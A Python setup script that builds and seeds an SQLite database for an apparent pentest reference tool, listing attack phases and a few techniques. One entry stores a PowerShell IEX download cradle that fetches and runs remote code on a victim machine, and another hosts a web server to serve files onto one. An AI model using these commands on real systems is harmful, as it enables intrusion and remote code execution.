#!/usr/bin/env python3
import sqlite3
import sys

print(sys.path[0])

connection = sqlite3.connect(sys.path[0] + '/../database.db')

sql_file = open(sys.path[0] + '/dbstructure.sql')
sql_as_string = sql_file.read()
cur = connection.cursor()
cur.executescript(sql_as_string)


## Fill the types in DB
cur.execute("INSERT INTO types(name) VALUES (?)", ('command',))
cur.execute("INSERT INTO types(name) VALUES (?)", ('tool',))

## Fill the attack oses
cur.execute("INSERT INTO attack_oses (os) VALUES (?)", ('linux',))
cur.execute("INSERT INTO attack_oses (os) VALUES (?)", ('windows',))
cur.execute("INSERT INTO attack_oses (os) VALUES (?)", ('mac',))
cur.execute("INSERT INTO attack_oses (os) VALUES (?)", ('other',))

## Fill the phases
cur.execute("INSERT INTO phases (phase) VALUES (?)", ('recon',))
cur.execute("INSERT INTO phases (phase) VALUES (?)", ('scanning',))
cur.execute("INSERT INTO phases (phase) VALUES (?)", ('initial foothold',))
cur.execute("INSERT INTO phases (phase) VALUES (?)", ('privesc',))
cur.execute("INSERT INTO phases (phase) VALUES (?)", ('maintain access',))
cur.execute("INSERT INTO phases (phase) VALUES (?)", ('covering',))
cur.execute("INSERT INTO phases (phase) VALUES (?)", ('general',))

## Insert items
cur.execute("INSERT INTO items (name, type_id, description, usage, source, cve, phase_id) VALUES (?,?,?,?,?,?,?)", 
('host webserver', 1, 'host a webserver to download files on a victim machine', 'python -m SimpleHTTPServer <PORT> or php -S <IP>:<PORT>', 'https://unix.stackexchange.com/questions/32182/simple-command-line-http-server' ,'NA', 4))

cur.execute("INSERT INTO items (name, type_id, description, usage, source, cve, phase_id) VALUES (?,?,?,?,?,?,?)", 
('powershell download', 1, 'download file using powershell command', 'powershell IEX(New-Object Net.WebClient).downloadString(http://<URL>/<FILE>) or powershell IEX(New-Object Net.WebClient).downloadFile(http://<URL>/<FILE>, <FILE>)', 'https://unix.stackexchange.com/questions/32182/simple-command-line-http-server' ,'NA', 4))

cur.execute("INSERT INTO items (name, type_id, description, usage, source, cve, phase_id) VALUES (?,?,?,?,?,?,?)", 
('GTFO-bins', 2, 'check for misconfiguration in Unix binaries', 'search on website', 'https://gtfobins.github.io/', 'NA', 4))

## Insert many-to-many
cur.execute("INSERT INTO item_attackos (item_id, attackos_id) VALUES (?, ?)", (1, 1))
cur.execute("INSERT INTO item_attackos (item_id, attackos_id) VALUES (?, ?)", (1, 2))
cur.execute("INSERT INTO item_attackos (item_id, attackos_id) VALUES (?, ?)", (1, 3))
cur.execute("INSERT INTO item_attackos (item_id, attackos_id) VALUES (?, ?)", (1, 4))
cur.execute("INSERT INTO item_attackos (item_id, attackos_id) VALUES (?, ?)", (2, 2))
cur.execute("INSERT INTO item_attackos (item_id, attackos_id) VALUES (?, ?)", (3, 1))

connection.commit()
connection.close()

